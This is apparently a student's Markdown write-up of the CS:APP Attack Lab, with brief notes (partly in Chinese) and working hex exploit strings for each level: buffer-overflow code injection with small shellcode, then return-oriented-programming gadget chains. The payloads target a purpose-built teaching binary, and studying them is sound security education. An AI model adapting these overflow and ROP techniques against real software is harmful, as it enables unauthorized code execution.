# Attack lab

## Code Injection

### level 1

easy, overflow to return to touch1

```txt
30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 c0 17 40
```

### level 2

overflow to make code return to someplace in stack, and execute some code for passing arguments and then call touch2.

```as
0000000000000000 <_start>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

```txt
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 dc 61 55 00 00 00 00
```

### level 3

like what you do in level 2, notice which place should the string put in the stack(the start of your input is errupted by the code and the other place will be used when ```push```). So you should put it at the end of buffer and return address of test.

```as
0000000000000000 <_start>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

```txt
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

## Return-Oriented Programming

### level 4

using ```popq``` to pass args.

```txt
30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
```

### level 5

我一开始跑了几遍以为rsi的值是固定的48，我还在想为什么实验文档说有8个gadget，我他妈3个就完了，结果跑的时候io库代码报错。麻了，之前出过一样的问题，怀疑是堆栈没有16字节对齐SSE&xmm，或者junk太长(缓冲区后面还塞了48个字符，我以为rsi就是offset固定为48)。排查了半天发现rsi有的时候变成49了，脑子也没转过这个弯来。

核心是根据lea指令两个参数去凑，rdi只能用mov，rsi只能movl顺便便于计算还要转几个弯。只能说结论下太早，后面完全被干扰了。

answer:

```txt
30 31 32 33 34 35 36 37 30 31 32 33 34 35 36 37 30 31 32 33 34 35 36 37 30 31 32 33 34 35 36 37 30 31 32 33 34 35 36 37 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```